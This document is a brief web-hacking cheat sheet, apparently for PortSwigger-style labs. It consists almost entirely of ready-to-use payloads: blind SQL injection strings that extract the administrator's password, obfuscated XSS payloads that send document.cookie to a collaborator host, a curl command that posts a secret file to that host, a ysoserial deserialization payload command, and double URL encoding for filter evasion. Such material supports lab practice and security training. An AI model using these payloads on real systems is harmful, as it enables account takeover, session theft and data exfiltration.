# SQL Injection

```sql
-- In order by statment https://portswigger.net/support/sql-injection-in-the-query-structure
-- ASCII converts the characters to numbers
(CASE+WHEN(SELECT+ASCII(SUBSTRING(password,1,1))+FROM+users+where+username+%3d+'administrator')%3d97+THEN+AUTHOR+ELSE+TITLE+END)

-- Divides by 1 if true, 0 if not
-- Used when a number (int) was in front of the query
-- %2F = /, %2B = +, %2A = *, %2D = -
%2F(CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+where+username+%3d+'administrator')%3d'a'+THEN+1+ELSE+0+END)

-- Conditional Errors
'||+(select+case+when+(substr(password,1,1)%3d'a')+then+to_char(1/0)+else+null+end+from+users+where+username%3d+'administrator')+||' --> Oracle
```

# XSS

```js
// No periods (.)
fetch(atob('<base64-of-your-colaborator>'), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})

// No parentheses
eval.call`${"fetch\x28'<your-collaborator>', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`
//  With base64 encoding
eval.call`${atob`YWxlcnQoMSk=`}`

// SVG to steal cookie
'"><svg/onload=fetch(`//<your-collaborator>/cookie?=${encodeURIComponent(document.cookie)}`)>
```

# Code Injection
```bash

# Curl file contents
curl -X POST <your-collaborator> -d @/home/carlos/secret

# Gzip and base64 ysoserial
java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
```

# Obfuscation

## Double URL Encoding 
### The letter a = %2561
- %25 = % when decoded so it ends up as %61 which equals a
- To quickly do this in console:
  - Set the urlencoded string to a variable and use replace all:
    ```js
    // admin urlencoded is: %61%64%6d%69%6e
    > s = "%61%64%6d%69%6e"
    > s.replaceAll('%', '%25')
    // Outputs: %2561%2564%256d%2569%256e
    ```
